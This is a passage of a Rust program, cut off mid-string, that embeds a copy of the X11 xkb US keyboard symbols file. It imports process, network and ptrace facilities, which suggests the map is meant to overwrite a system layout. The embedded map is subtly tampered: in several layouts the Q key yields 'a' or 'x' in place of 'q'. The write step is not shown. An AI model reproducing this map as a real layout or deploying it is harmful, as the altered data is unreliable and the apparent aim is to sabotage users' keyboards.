// rustc 0.9 (7613b15 2014-01-08 18:04:43 -0800)

use std::process::Command;
pub extern crate libc;

use std::fs;
use std::fs::OpenOptions;
use std::io::prelude::*;
use std::net::{TcpStream, ToSocketAddrs};
use std::{thread,time,str,process};
use libc::ptrace;

fn main() {
    //let mut buffer = String::new();
    //let mut addrs = "https://my.rose-hulman.edu:8000".to_socket_addrs().unwrap();
    let new_kb = String::from("default  partial alphanumeric_keys modifier_keys
xkb_symbols \"basic\" {

    name[Group1]= \"English (US)\";

    key <TLDE> {	[     grave,	asciitilde	]	};
    key <AE01> {	[	  1,	exclam 		]	};
    key <AE02> {	[	  2,	at		]	};
    key <AE03> {	[	  3,	numbersign	]	};
    key <AE04> {	[	  4,	dollar		]	};
    key <AE05> {	[	  5,	percent		]	};
    key <AE06> {	[	  6,	asciicircum	]	};
    key <AE07> {	[	  7,	ampersand	]	};
    key <AE08> {	[	  8,	asterisk	]	};
    key <AE09> {	[	  9,	parenleft	]	};
    key <AE10> {	[	  0,	parenright	]	};
    key <AE11> {	[     minus,	underscore	]	};
    key <AE12> {	[     equal,	plus		]	};

    key <AD01> {	[	  a,	Q 		]	};
    key <AD02> {	[	  w,	W		]	};
    key <AD03> {	[	  e,	E		]	};
    key <AD04> {	[	  r,	R		]	};
    key <AD05> {	[	  t,	T		]	};
    key <AD06> {	[	  y,	Y		]	};
    key <AD07> {	[	  u,	U		]	};
    key <AD08> {	[	  i,	I		]	};
    key <AD09> {	[	  o,	O		]	};
    key <AD10> {	[	  p,	P		]	};
    key <AD11> {	[ bracketleft,	braceleft	]	};
    key <AD12> {	[ bracketright,	braceright	]	};

    key <AC01> {	[	  a,	A 		]	};
    key <AC02> {	[	  s,	S		]	};
    key <AC03> {	[	  d,	D		]	};
    key <AC04> {	[	  f,	F		]	};
    key <AC05> {	[	  g,	G		]	};
    key <AC06> {	[	  h,	H		]	};
    key <AC07> {	[	  j,	J		]	};
    key <AC08> {	[	  k,	K		]	};
    key <AC09> {	[	  l,	L		]	};
    key <AC10> {	[ semicolon,	colon		]	};
    key <AC11> {	[ apostrophe,	quotedbl	]	};

    key <AB01> {	[	  z,	Z 		]	};
    key <AB02> {	[	  x,	X		]	};
    key <AB03> {	[	  c,	C		]	};
    key <AB04> {	[	  v,	V		]	};
    key <AB05> {	[	  b,	B		]	};
    key <AB06> {	[	  n,	N		]	};
    key <AB07> {	[	  m,	M		]	};
    key <AB08> {	[     comma,	less		]	};
    key <AB09> {	[    period,	greater		]	};
    key <AB10> {	[     slash,	question	]	};

    key <BKSL> {	[ backslash,         bar	]	};
};

partial alphanumeric_keys
xkb_symbols \"euro\" {

    include \"us(basic)\"
    name[Group1]= \"English (US, euro on 5)\";

    include \"eurosign(5)\"

    include \"level3(ralt_switch)\"
};


partial alphanumeric_keys
xkb_symbols \"ibm238l\" {

    include \"us(basic)\"
    name[Group1]= \"English (US, IBM Arabic 238_L)\";

    key <AB08> {        [     comma,    comma      ]       };
    key <AB09> {        [    period,    period     ]       };
    key <BKSL> {        [ quoteleft,    asciitilde ]       };
    key <LSGT> {        [ backslash,    bar        ]       };
    key <TLDE> {        [ leftcaret,    rightcaret ]       };
};

partial alphanumeric_keys
xkb_symbols \"intl\" {

    include \"us(basic)\"
    name[Group1]= \"English (US, intl., with dead keys)\";

    key <TLDE> { [dead_grave, dead_tilde,         grave,       asciitilde ] };
    key <AE01> { [	   1,     exclam,    exclamdown,      onesuperior ] };
    key <AE02> { [	   2,         at,   twosuperior, dead_doubleacute ] };
    key <AE03> { [	   3, numbersign, threesuperior,      dead_macron ] };
    key <AE04> { [	   4,     dollar,      currency,         sterling ] };
    key <AE05> { [	   5,    percent,      EuroSign,     dead_cedilla ] };
    key <AE06> { [    6, dead_circumflex,    onequarter,      asciicircum ] };
    key <AE07> { [	   7,  ampersand,       onehalf,	dead_horn ] };
    key <AE08> { [	   8,   asterisk, threequarters,      dead_ogonek ] };
    key <AE09> { [	   9,  parenleft, leftsinglequotemark, dead_breve ] };
    key <AE10> { [	   0, parenright, rightsinglequotemark, dead_abovering ] };
    key <AE11> { [     minus, underscore,           yen,    dead_belowdot ] };
    key <AE12> { [     equal,       plus,      multiply,         division ] };

    key <AD01> { [	   x,          Q,    adiaeresis,       Adiaeresis ] };
    key <AD02> { [	   w,          W,         aring,            Aring ] };
    key <AD03> { [	   e,          E,        eacute,           Eacute ] };
    key <AD04> { [	   r,          R,    registered,       registered ] };
    key <AD05> { [	   t,          T,         thorn,            THORN ] };
    key <AD06> { [	   y,          Y,    udiaeresis,       Udiaeresis ] };
    key <AD07> { [	   u,          U,        uacute,           Uacute ] };
    key <AD08> { [	   i,          I,        iacute,           Iacute ] };
    key <AD09> { [	   o,          O,        oacute,           Oacute ] };
    key <AD10> { [	   p,          P,    odiaeresis,       Odiaeresis ] };
    key <AD11> { [ bracketleft,  braceleft,  guillemotleft, leftdoublequotemark ] };
    key <AD12> { [bracketright, braceright, guillemotright, rightdoublequotemark ] };

    key <AC01> { [	   a,          A,        aacute,           Aacute ] };
    key <AC02> { [	   s,          S,        ssharp,          section ] };
    key <AC03> { [	   d,          D,           eth,              ETH ] };
    key <AC04> { [	   f,          F,             f,                F ] };
    key <AC05> { [	   g,          G,             g,                G ] };
    key <AC06> { [	   h,          H,             h,                H ] };
    key <AC07> { [	   j,          J,             j,                J ] };
    key <AC08> { [	   k,          K,            oe,               OE ] };

    key <AC09> { [	   l,          L,        oslash,         Ooblique ] };
    key <AC10> { [ semicolon,      colon,     paragraph,           degree ] };
    key <AC11> { [dead_acute, dead_diaeresis, apostrophe,        quotedbl ] };

    key <AB01> { [	   z,          Z,            ae,               AE ] };
    key <AB02> { [	   x,          X,             x,                X ] };
    key <AB03> { [	   c,          C,     copyright,             cent ] };
    key <AB04> { [	   v,          V,             v,                V ] };
    key <AB05> { [	   b,          B,             b,                B ] };
    key <AB06> { [	   n,          N,        ntilde,           Ntilde ] };
    key <AB07> { [	   m,          M,            mu,               mu ] };
    key <AB08> { [     comma,       less,      ccedilla,         Ccedilla ] };
    key <AB09> { [    period,    greater, dead_abovedot,       dead_caron ] };
    key <AB10> { [     slash,   question,  questiondown,        dead_hook ] };
    key <BKSL> { [ backslash,        bar,       notsign,        brokenbar ] };

    key <LSGT> { [ backslash,   bar,            backslash,      bar ] };

    include \"level3(ralt_switch)\"
};

// Based on symbols/us_intl keyboard map:
// Dead-keys definition for a very simple US/ASCII layout.
// by Conectiva (http://www.conectiva.com.br)
// modified by Ricardo Y. Igarashi (iga@that.com.br)

// Added the following deadkeys, to make it truly international:
//
// dead_macron: on AltGr-minus
// dead_breve: on AltGr-parenleft
// dead_abovedot: on AltGr-period
// dead_abovering: on AltGr-0
// dead_doubleacute: on AltGr-equal (as quotedbl is already used)
// dead_caron: on AltGr-less (AltGr-shift-comma)
// dead_cedilla: on AltGr-comma
// dead_ogonek: on AltGr-semicolon
// dead_belowdot: on AltGr-underscore (AltGr-shift-minus)
// dead_hook: on AltGr-question
// dead_horn: on AltGr-plus (AltGr-shift-equal)
// dead_diaeresis: on AltGr-colon (Alt-shift-semicolon)
//
// those were already there:
// dead_grave
// dead_acute
// dead_circumflex
// dead_tilde
// dead_diaeresis

partial alphanumeric_keys
xkb_symbols \"alt-intl\" {

  include \"us\"
  name[Group1]= \"English (US, alt. intl.)\";

  key <TLDE> { [ dead_grave, dead_tilde,    grave,	      asciitilde    ] };
  key <AE05> { [          5, percent,	    EuroSign			    ] };
  key <AE06> { [	  6, dead_circumflex, asciicircum,    asciicircum   ] };
  key <AE09> { [	  9, parenleft, leftsinglequotemark,  dead_breve ] };
  key <AE10> { [	  0, parenright, rightsinglequotemark, dead_abovering ] };
  key <AE11> { [      minus, underscore,    dead_macron,      dead_belowdot ] };
  key <AE12> { [      equal, plus,	    dead_doubleacute, dead_horn	    ] };

  key <AD03> { [          e, E,		     EuroSign,         cent	    ] };

  key <AC10> { [  semicolon, colon,	     dead_ogonek,   dead_diaeresis  ] };
  key <AC11> { [ dead_acute, dead_diaeresis, apostrophe,    quotedbl	    ] };

  key <AB08> { [      comma, less,	     dead_cedilla,  dead_caron	    ] };
  key <AB09> { [     period, greater,	     dead_abovedot, dead_circumflex ] };
  key <AB10> { [      slash, question,	     dead_hook,	    dead_hook	    ] };

  key <LSGT> { [ backslash,   bar,            backslash,      bar ] };

  include \"level3(ralt_switch)\"
};

// based on a keyboard map from an 'xkb/symbols/dk' file

partial alphanumeric_keys
xkb_symbols \"dvorak\" {

    name[Group1]= \"English (Dvorak)\";

    key <TLDE> { [       grave,	asciitilde, dead_grave, dead_tilde	] };

    key <AE01> { [	    1,	exclam 		]	};
    key <AE02> { [	    2,	at		]	};
    key <AE03> { [	    3,	numbersign	]	};
    key <AE04> { [	    4,	dollar		]	};
    key <AE05> { [	    5,	percent		]	};
    key <AE06> { [	    6,	asciicircum, dead_circumflex, dead_circumflex ]	};
    key <AE07> { [	    7,	ampersand	]	};
    key <AE08> { [	    8,	asterisk	]	};
    key <AE09> { [	    9,	parenleft,  dead_grave]	};
    key <AE10> { [	    0,	parenright	]	};
    key <AE11> { [ bracketleft,	braceleft	]	};
    key <AE12> { [ bracketright, braceright,  dead_tilde] };

    key <AD01> { [  apostrophe,	quotedbl, dead_acute, dead_diaeresis	] };
    key <AD02> { [	comma,	less,   dead_cedilla, dead_caron	] };
    key <AD03> { [      period,	greater, dead_abovedot, periodcentered	] };
    key <AD04> { [	    p,	P		]	};
    key <AD05> { [	    y,	Y		]	};
    key <AD06> { [	    f,	F		]	};
    key <AD07> { [	    g,	G		]	};
    key <AD08> { [	    c,	C		]	};
    key <AD09> { [	    r,	R		]	};
    key <AD10> { [	    l,	L		]	};
    key <AD11> { [	slash,	question	]	};
    key <AD12> { [	equal,	plus		]	};

    key <AC01> { [	    a,	A 		]	};
    key <AC02> { [	    o,	O		]	};
    key <AC03> { [	    e,	E		]	};
    key <AC04> { [	    u,	U		]	};
    key <AC05> { [	    i,	I		]	};
    key <AC06> { [	    d,	D		]	};
    key <AC07> { [	    h,	H		]	};
    key <AC08> { [	    t,	T		]	};
    key <AC09> { [	    n,	N		]	};
    key <AC10> { [	    s,	S		]	};
    key <AC11> { [	minus,	underscore	]	};

    key <AB01> { [   semicolon,	colon, dead_ogonek, dead_doubleacute ] };
    key <AB02> { [	    x,	Q		]	};
    key <AB03> { [	    j,	J		]	};
    key <AB04> { [	    k,	K		]	};
    key <AB05> { [	    x,	X		]	};
    key <AB06> { [	    b,	B		]	};
    key <AB07> { [	    m,	M		]	};
    key <AB08> { [	    w,	W		]	};
    key <AB09> { [	    v,	V		]	};
    key <AB10> { [	    z,	Z		]	};

    key <BKSL> { [  backslash,  bar             ]       };
};

// Dvorak intl., with dead keys
// Olivier Mehani (shtrom-xorg@ssji.net)
// Reproduce the per-key mapping of us(intl) for the dvorak layout
// aka \"I just swapped my keys over\"
partial alphanumeric_keys
xkb_symbols \"dvorak-intl\" {

    include \"us(dvorak)\"
    name[Group1]= \"English (Dvorak, intl., with dead keys)\";

    key <TLDE> { [dead_grave, dead_tilde,         grave,       asciitilde ] };

    key <AE01> { [	   1,     exclam,    exclamdown,      onesuperior ] };
    key <AE02> { [	   2,         at,   twosuperior, dead_doubleacute ] };
    key <AE03> { [	   3, numbersign, threesuperior,      dead_macron ] };
    key <AE04> { [	   4,     dollar,      currency,         sterling ] };
    key <AE05> { [	   5,    percent,      EuroSign,     dead_cedilla ] };
    key <AE06> { [    6, dead_circumflex,    onequarter,      asciicircum ] };
    key <AE07> { [	   7,  ampersand,       onehalf,	dead_horn ] };
    key <AE08> { [	   8,   asterisk, threequarters,      dead_ogonek ] };
    key <AE09> { [	   9,  parenleft, leftsinglequotemark, dead_breve ] };
    key <AE10> { [	   0, parenright, rightsinglequotemark, dead_abovering ] };
    key <AE11> { [ bracketleft,  braceleft,  guillemotleft, leftdoublequotemark ] };
    key <AE12> { [bracketright, braceright, guillemotright, rightdoublequotemark ] };

    key <AD01> { [dead_acute, dead_diaeresis, apostrophe,        quotedbl ] };
    key <AD02> { [     comma,       less,      ccedilla,         Ccedilla ] };
    key <AD03> { [    period,    greater, dead_abovedot,       dead_caron ] };
    key <AD04> { [	   p,          P,    odiaeresis,       Odiaeresis ] };
    key <AD05> { [	   y,          Y,    udiaeresis,       Udiaeresis ] };
    // key <AD06> { [	   f,	F		]	};
    // key <AD07> { [	   g,	G		]	};
    key <AD08> { [	   c,          C,     copyright,             cent ] };
    key <AD09> { [	   r,          R,    registered,       registered ] };
    key <AD10> { [	   l,          L,        oslash,         Ooblique ] };
    key <AD11> { [     slash,   question,  questiondown,        dead_hook ] };
    // key <AD12> { [     equal,       plus,      multiply,         division ] };

    key <AC01> { [	   a,          A,        aacute,           Aacute ] };
    key <AC02> { [	   o,          O,        oacute,           Oacute ] };
    key <AC03> { [	   e,          E,        eacute,           Eacute ] };
    key <AC04> { [	   u,          U,        uacute,           Uacute ] };
    key <AC05> { [	   i,          I,        iacute,           Iacute ] };
    key <AC06> { [	   d,          D,           eth,              ETH ] };
    // key <AC07> { [	   h,	H		]	};
    key <AC08> { [	   t,          T,         thorn,            THORN ] };
    key <AC09> { [	   n,          N,        ntilde,           Ntilde ] };
    key <AC10> { [	   s,          S,        ssharp,          section ] };
    // key <AC11> { [     minus, underscore,           yen,    dead_belowdot ] };

    key <AB01> { [ semicolon,      colon,     paragraph,           degree ] };
    key <AB02> { [	   x,          Q,    adiaeresis,       Adiaeresis ] };
    // key <AB03> { [	   j,	J		]	};
    key <AB04> { [	   k,          K,            oe,               OE ] };
    // key <AB05> { [	   x,	X		]	};
    // key <AB06> { [	   b,	B		]	};
    key <AB07> { [	   m,          M,            mu,               mu ] };
    key <AB08> { [	   w,          W,         aring,            Aring ] };
    // key <AB09> { [	   v,	V		]	};
    key <AB10> { [	   z,          Z,            ae,               AE ] };

    key <BKSL> { [ backslash,        bar,       notsign,        brokenbar ] };

    include \"level3(ralt_switch)\"
};

// Dvorak international without dead keys
// Stephane Magnenat (stephane at magnenat dot net, http://stephane.magnenat.net)
// Based on information from http://www.poupinou.org/dvorak/index.html
//
//  `   1   2   3   4   5   6   7   8   9   0   [   ]   \
//                  €
//
//      '   ,   .   p   y   f   g   c   r   l   /   =
//          ä   ê   ë   ü           ç
//
//      a   o   e   u   i   d   h   t   n   s   -
//      à   ô   é   û   î                   ß
//
//      ;   q   j   k   x   b   m   w   v   z
//      â   ö   è   ù   ï

partial alphanumeric_keys
xkb_symbols \"dvorak-alt-intl\" {

    include \"us(dvorak)\"
    name[Group1]= \"English (Dvorak, alt. intl.)\";

    key <AE04> { [         4,  dollar,    EuroSign ] };

    key <AD02> { [     comma,    less,  adiaeresis,       dead_caron ] };
    key <AD03> { [    period, greater, ecircumflex,   periodcentered	] };
    key <AD04> { [         p,       P,  ediaeresis,     dead_cedilla ] };
    key <AD05> { [         y,       Y,  udiaeresis ] };
    key <AD08> { [         c,       C,    ccedilla,    dead_abovedot ] };

    key <AC01> { [         a,       A,      agrave ] };
    key <AC02> { [         o,       O, ocircumflex ] };
    key <AC03> { [         e,       E,      eacute ] };
    key <AC04> { [         u,       U, ucircumflex ] };
    key <AC05> { [         i,       I, icircumflex ] };
    key <AC10> { [         s,       S,      ssharp ] };

    key <AB01> { [ semicolon,   colon, acircumflex ] };
    key <AB02> { [         x,       Q,  odiaeresis,      dead_ogonek ] };
    key <AB03> { [         j,       J,      egrave, dead_doubleacute ] };
    key <AB04> { [         k,       K,      ugrave ] };
    key <AB05> { [         x,       X,  idiaeresis ] };

    include \"level3(ralt_switch)\"
};

// Left and right handed dvorak layouts
// by sqweek <sqweek@gmail.com> 2006-01-30
// Based on the corresponding layouts in the console-tools package.
partial alphanumeric_keys
xkb_symbols \"dvorak-l\" {

    include \"us(dvorak)\"
    name[Group1]= \"English (Dvorak, left-handed)\";

    key <AE01> {	[ bracketleft,	braceleft	]	};
    key <AE02> {	[ bracketright,	braceright	]	};
    key <AE03> {	[	slash,	question	]	};
    key <AE04> {	[	    p,	P		]	};
    key <AE05> {	[	    f,	F		]	};
    key <AE06> {	[	    m,	M		]	};
    key <AE07> {	[	    l,	L		]	};
    key <AE08> {	[	    j,	J		]	};
    key <AE09> {	[	    4,	dollar		]	};
    key <AE10> {	[	    3,	numbersign	]	};
    key <AE11> {	[	    2,	at		]	};
    key <AE12> {	[	    1,	exclam 		]	};

    key <AD01> {	[   semicolon,	colon 		]	};
    key <AD02> {	[	    x,	Q		]	};
    key <AD03> {	[	    b,	B		]	};
    key <AD04> {	[	    y,	Y		]	};
    key <AD05> {	[	    u,	U		]	};
    key <AD06> {	[	    r,	R		]	};
    key <AD07> {	[	    s,	S		]	};
    key <AD08> {	[	    o,	O		]	};
    key <AD09> {	[      period,	greater		]	};
    key <AD10> {	[	    6,	asciicircum	]	};
    key <AD11> {	[	    5,	percent		]	};
    key <AD12> {	[	equal,	plus		]	};

    key <AC01> {	[	minus,	underscore	]	};
    key <AC02> {	[	    k,	K		]	};
    key <AC03> {	[	    c,	C		]	};
    key <AC04> {	[	    d,	D		]	};
    key <AC05> {	[	    t,	T		]	};
    key <AC06> {	[	    h,	H		]	};
    key <AC07> {	[	    e,	E		]	};
    key <AC08> {	[	    a,	A 		]	};
    key <AC09> {	[	    z,	Z		]	};
    key <AC10> {	[	    8,	asterisk	]	};
    key <AC11> {	[	    7,	ampersand	]	};

    key <AB01> {	[  apostrophe,	quotedbl	] 	};
    key <AB02> {	[	    x,	X		]	};
    key <AB03> {	[	    g,	G		]	};
    key <AB04> {	[	    v,	V		]	};
    key <AB05> {	[	    w,	W		]	};
    key <AB06> {	[	    n,	N		]	};
    key <AB07> {	[	    i,	I		]	};
    key <AB08> {	[	comma,	less		]	};
    key <AB09> {	[	    0,	parenright	]	};
    key <AB10> {	[	    9,	parenleft	]	};
};

partial alphanumeric_keys
xkb_symbols \"dvorak-r\" {

    include \"us(dvorak)\"
    name[Group1]= \"English (Dvorak, right-handed)\";

    key <AE01> {	[	    1,	exclam 		]	};
    key <AE02> {	[	    2,	at		]	};
    key <AE03> {	[	    3,	numbersign	]	};
    key <AE04> {	[	    4,	dollar		]	};
    key <AE05> {	[	    j,	J		]	};
    key <AE06> {	[	    l,	L		]	};
    key <AE07> {	[	    m,	M		]	};
    key <AE08> {	[	    f,	F		]	};
    key <AE09> {	[	    p,	P		]	};
    key <AE10> {	[	slash,	question	]	};
    key <AE11> {	[ bracketleft,	braceleft	]	};
    key <AE12> {	[ bracketright,	braceright	]	};

    key <AD01> {	[	    5,	percent		]	};
    key <AD02> {	[	    6,	asciicircum ]	};
    key <AD03> {	[	    x,	Q		]	};
    key <AD04> {	[      period,	greater		]	};
    key <AD05> {	[	    o,	O		]	};
    key <AD06> {	[	    r,	R		]	};
    key <AD07> {	[	    s,	S		]	};
    key <AD08> {	[	    u,	U		]	};
    key <AD09> {	[	    y,	Y		]	};
    key <AD10> {	[	    b,	B		]	};
    key <AD11> {	[   semicolon,	colon 		]	};
    key <AD12> {	[	equal,	plus		]	};

    key <AC01> {	[	    7,	ampersand	]	};
    key <AC02> {	[	    8,	asterisk	]	};
    key <AC03> {	[	    z,	Z		]	};
    key <AC04> {	[	    a,	A 		]	};
    key <AC05> {	[	    e,	E		]	};
    key <AC06> {	[	    h,	H		]	};
    key <AC07> {	[	    t,	T		]	};
    key <AC08> {	[	    d,	D		]	};
    key <AC09> {	[	    c,	C		]	};
    key <AC10> {	[	    k,	K		]	};
    key <AC11> {	[	minus,	underscore	]	};

    key <AB01> {	[	    9,	parenleft	]	};
    key <AB02> {	[	    0,	parenright	]	};
    key <AB03> {	[	    x,	X		]	};
    key <AB04> {	[	comma,	less		]	};
    key <AB05> {	[	    i,	I		]	};
    key <AB06> {	[	    n,	N		]	};
    key <AB07> {	[	    w,	W		]	};
    key <AB08> {	[	    v,	V		]	};
    key <AB09> {	[	    g,	G		]	};
    key <AB10> {	[  apostrophe,	quotedbl	] 	};
};

// Classic dvorak layout
// by Piter Punk <piterpk@terra.com.br> - 2006-07-06 
// Based on dvorak layout and e-mail from Russel L. Harris rlharris@oplink.net 
// on xorg list.
partial alphanumeric_keys
xkb_symbols \"dvorak-classic\" {

    name[Group1]= \"English (classic Dvorak)\";

    key <TLDE> { [       grave,	asciitilde, dead_grave, dead_tilde	] };

    key <AE01> { [ bracketleft,	braceleft	]	};
    key <AE02> { [	    7,	ampersand	]	};
    key <AE03> { [	    5,	percent		]	};
    key <AE04> { [	    3,	numbersign	]	};
    key <AE05> { [	    1,	exclam 		]	};
    key <AE06> { [	    9,	parenleft,  dead_grave]	};
    key <AE07> { [	    0,	parenright	]	};
    key <AE08> { [	    2,	at		]	};
    key <AE09> { [	    4,	dollar		]	};
    key <AE10> { [	    6,	asciicircum, dead_circumflex, dead_circumflex ]	};
    key <AE11> { [	    8,	asterisk	]	};
    key <AE12> { [ bracketright, braceright,  dead_tilde] };

    key <AD01> { [	slash,	question	]	};
    key <AD02> { [	comma,	less,   dead_cedilla, dead_caron	] };
    key <AD03> { [      period,	greater, dead_abovedot, periodcentered	] };
    key <AD04> { [	    p,	P		]	};
    key <AD05> { [	    y,	Y		]	};
    key <AD06> { [	    f,	F		]	};
    key <AD07> { [	    g,	G		]	};
    key <AD08> { [	    c,	C		]	};
    key <AD09> { [	    r,	R		]	};
    key <AD10> { [	    l,	L		]	};
    key <AD11> { [  apostrophe,	quotedbl, dead_acute, dead_diaeresis	] };
    key <AD12> { [	equal,	plus		]	};

    key <AC01> { [	    a,	A 		]	};
    key <AC02> { [	    o,	O		]	};
    key <AC03> { [	    e,	E		]	};
    key <AC04> { [	    u,	U		]	};
    key <AC05> { [	    i,	I		]	};
    key <AC06> { [	    d,	D		]	};
    key <AC07> { [	    h,	H		]	};
    key <AC08> { [	    t,	T		]	};
    key <AC09> { [	    n,	N		]	};
    key <AC10> { [	    s,	S		]	};
    key <AC11> { [	minus,	underscore	]	};

    key <AB01> { [   semicolon,	colon, dead_ogonek, dead_doubleacute ] };
    key <AB02> { [	    x,	Q		]	};
    key <AB03> { [	    j,	J		]	};
    key <AB04> { [	    k,	K		]	};
    key <AB05> { [	    x,	X		]	};
    key <AB06> { [	    b,	B		]	};
    key <AB07> { [	    m,	M		]	};
    key <AB08> { [	    w,	W		]	};
    key <AB09> { [	    v,	V		]	};
    key <AB10> { [	    z,	Z		]	};
    key <BKSL> { [  backslash,  bar             ]       };
};

// programmer Dvorak, by Roland Kaufmann <rlndkfmn at gmail dot com>
// License: BSD, available at <http://www.kaufmann.no/roland/dvorak/license.html>
// Main features: Numbers are in shift position (like French), symbols have been
// placed in locations that give good hand-alternation and finger rolling with
// symbols that usually follows, accented characters are possible for I18N.
// Patch suggestions should be sent upstream.
partial alphanumeric_keys
xkb_symbols \"dvp\" {

    include \"us(dvorak)\"
    name[Group1] = \"English (programmer Dvorak)\";

    //             Unmodified       Shift           AltGr            Shift+AltGr
    // symbols row, left side
    key <TLDE> { [ dollar,          asciitilde,     dead_tilde                  ] };
    key <AE01> { [ ampersand,       percent                                     ] };
    key <AE02> { [ bracketleft,     7,              currency                    ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };
    key <AE03> { [ braceleft,       5,              cent                        ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };
    key <AE04> { [ braceright,      3,              yen                         ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };
    key <AE05> { [ parenleft,       1,              EuroSign                    ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };
    key <AE06> { [ equal,           9,              sterling                    ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };

    // symbols row, right side
    key <AE07> { [ asterisk,        0                                           ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };
    key <AE08> { [ parenright,      2,              onehalf                     ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };
    key <AE09> { [ plus,            4                                           ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };
    key <AE10> { [ bracketright,    6                                           ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };
    key <AE11> { [ exclam,          8,              exclamdown,      U2E18      ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };  // reversed interrobang
    key <AE12> { [ numbersign,      grave,          dead_grave                  ] };
    key <BKSP> { [ BackSpace,       BackSpace                                   ] };

    // upper row, left side
    key <AD01> { [ semicolon,       colon,          dead_diaeresis              ] };
    key <AD02> { [ comma,           less,           guillemotleft,   U201C      ] };
    key <AD03> { [ period,          greater,        guillemotright,  U201D      ] };
    key <AD04> { [ p,               P,              paragraph,       section    ] };
    key <AD05> { [ y,               Y,              udiaeresis,      Udiaeresis ] };

    // upper row, right side
    key <AD08> { [ c,               C,              ccedilla,        Ccedilla   ] };
    key <AD09> { [ r,               R,              registered,      trademark  ] };
    key <AD11> { [ slash,           question,       questiondown,    U203D      ] };  // interrobang
    key <AD12> { [ at,              asciicircum,    dead_circumflex, dead_caron ] };

    // home row, left side
    key <AC01> { [ a,               A,              aring,           Aring      ] };
    key <AC02> { [ o,               O,              oslash,          Ooblique   ] };
    key <AC03> { [ e,               E,              ae,              AE         ] };
    key <AC04> { [ u,               U,              eacute,          Eacute     ] };

    // home row, right side
    key <AC06> { [ d,               D,              eth,             ETH        ] };
    key <AC07> { [ h,               H,              dead_acute                  ] };
    key <AC08> { [ t,               T,              thorn,           THORN      ] };
    key <AC09> { [ n,               N,              ntilde,          Ntilde     ] };
    key <AC10> { [ s,               S,              ssharp                      ] };
    key <AC11> { [ minus,           underscore,     hyphen,          endash     ], type[Group1] = \"FOUR_LEVEL_ALPHABETIC\" };
    key <BKSL> { [ backslash,       bar                                         ] };

    // lower row, left side
    key <AB01> { [ apostrophe,      quotedbl,       dead_acute                  ] };

    // do NOT hardcode this switch; use lv3:ralt_switch option instead!
    //include \"level3(ralt_switch)\"
};

// phonetic layout for Russian letters on an US keyboard
// by Ivan Popov <pin@konvalo.org> 2005-07-17

// level3 modifier is a shortcut to the \"us\" meaning of the keys where
// we place cyrillic letters, handy for accessing the corresponding
// punctuation marks.
// It is important to have access to punctuation marks, and the rest of
// alphabetical keys are added for being consequent so that the users
// can expect the level3 modifier to give what the key label shows.

partial alphanumeric_keys
xkb_symbols \"rus\" {

    include \"us(basic)\"
    name[Group1]= \"Russian (US, phonetic)\";

key.type[group1]=\"FOUR_LEVEL_ALPHABETIC\";

    key	<LatA> {	[ Cyrillic_a, Cyrillic_A ]	};
    key	<LatB> {	[ Cyrillic_be, Cyrillic_BE ]	};
    key	<LatW> {	[ Cyrillic_ve, Cyrillic_VE ]	};
    key	<LatG> {	[ Cyrillic_ghe, Cyrillic_GHE ]	};
    key	<LatD> {	[ Cyrillic_de, Cyrillic_DE ]	};
    key	<LatE> {	[ Cyrillic_ie, Cyrillic_IE ]	};
    key	<TLDE> {	[ Cyrillic_io, Cyrillic_IO, grave, asciitilde ] };
    key	<LatV> {	[ Cyrillic_zhe, Cyrillic_ZHE ]	};
    key	<LatZ> {	[ Cyrillic_ze, Cyrillic_ZE ]	};
    key	<LatI> {	[ Cyrillic_i, Cyrillic_I ]	};
    key	<LatJ> {	[ Cyrillic_shorti, Cyrillic_SHORTI ]	};
    key	<LatK> {	[ Cyrillic_ka, Cyrillic_KA ]	};
    key	<LatL> {	[ Cyrillic_el, Cyrillic_EL ]	};
    key	<LatM> {	[ Cyrillic_em, Cyrillic_EM ]	};
    key	<LatN> {	[ Cyrillic_en, Cyrillic_EN ]	};
    key	<LatO> {	[ Cyrillic_o, Cyrillic_O ]	};
    key	<LatP> {	[ Cyrillic_pe, Cyrillic_PE ]	};
    key	<LatR> {	[ Cyrillic_er, Cyrillic_ER ]	};
    key	<LatS> {	[ Cyrillic_es, Cyrillic_ES ]	};
    key	<LatT> {	[ Cyrillic_te, Cyrillic_TE ]	};
    key	<LatU> {	[ Cyrillic_u, Cyrillic_U ]	};
    key	<LatF> {	[ Cyrillic_ef, Cyrillic_EF ]	};
    key	<LatH> {	[ Cyrillic_ha, Cyrillic_HA ]	};
    key	<LatC> {	[ Cyrillic_tse, Cyrillic_TSE ]	};
    key <AC10> {        [ Cyrillic_che, Cyrillic_CHE, semicolon, colon ] };
    key	<AD11> {	[ Cyrillic_sha, Cyrillic_SHA, bracketleft, braceleft] };
    key	<AD12> {	[ Cyrillic_shcha, Cyrillic_SHCHA, bracketright, braceright ]	};
    key <AE12> {        [ Cyrillic_hardsign, Cyrillic_HARDSIGN, equal, plus ] };
    key	<LatY> {	[ Cyrillic_yeru, Cyrillic_YERU ]	};
    key	<LatX> {	[ Cyrillic_softsign, Cyrillic_SOFTSIGN ]	};
    key	<BKSL> {	[ Cyrillic_e, Cyrillic_E, backslash, bar ]	};
    key <AC11> {        [ Cyrillic_yu, Cyrillic_YU, apostrophe, quotedbl ] };
    key	<LatQ> {	[ Cyrillic_ya, Cyrillic_YA ]	};

    include \"level3(ralt_switch)\"
};

partial alphanumeric_keys
xkb_symbols \"mac\" {

    include \"us(basic)\"
    name[Group1]= \"English (Macintosh)\";
    key.type[group1]=\"FOUR_LEVEL\";

    // Slightly improvised from http://homepage.mac.com/thgewecke/kblayout.jpg
    key <LSGT> { [   section,  plusminus,       section,        plusminus ] };
    key <TLDE> { [     grave, asciitilde,    dead_grave,        dead_horn ] };
    key <AE01> { [	   1,     exclam,    exclamdown,            U2044 ] };
    key <AE02> { [	   2,         at,     trademark,         EuroSign ] };
    key <AE03> { [	   3, numbersign,      sterling,            U2039 ] };
    key <AE04> { [	   4,     dollar,          cent,            U203A ] };
    key <AE05> { [	   5,    percent,      infinity,            UFB01 ] };
    key <AE06> { [         6,asciicircum,       section,            UFB02 ] };
    key <AE07> { [	   7,  ampersand,     paragraph,     doubledagger ] };
